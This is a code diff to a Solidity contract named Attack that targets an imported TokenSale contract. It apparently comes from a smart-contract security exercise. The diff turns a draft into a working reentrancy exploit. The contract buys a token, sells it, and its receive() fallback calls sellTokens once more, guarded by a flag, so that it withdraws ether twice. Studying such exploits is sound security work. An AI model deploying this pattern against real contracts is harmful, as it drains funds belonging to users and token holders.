@@ -4,34 +4,28 @@ import "./TokenSale.sol";
 
 
 contract Attack {
+    bool avoidLoop;
 
     TokenSale public ts;
-    uint maxTokens;
 
-    constructor(address _addr) public {
+    constructor(address _addr) public payable {
+        require(msg.value >= 1 ether, "You need at least 1 ether to attack!");
         ts = TokenSale(_addr);
     }
 
-    /* function reentrancy() public payable {
-        require(msg.value >= 0.20 ether, "At least 1");
-        require((msg.value % 0.20 ether == 0), "Multipels of 5");
-        maxTokens = msg.value * 5;
-
-        ts.buyTokens{ value: msg.value }(maxTokens);
-        ts.sellTokens(maxTokens);
-    } */
-
-    function reentrancy() public payable {
+    function reentrancy() public {
         ts.buyTokens{ value: 1 ether }(1);
-        ts.sellTokens(maxTokens);
+        ts.sellTokens(1);
     }
 
     function getBalance() public view returns (uint) {
         return address(this).balance;
     }
 
-    receive() external payable{
-        ts.sellTokens(maxTokens);
+    receive() external payable {
+        if (!avoidLoop) {
+            avoidLoop = true;
+            ts.sellTokens(1);
+        }      
     }
-
 }
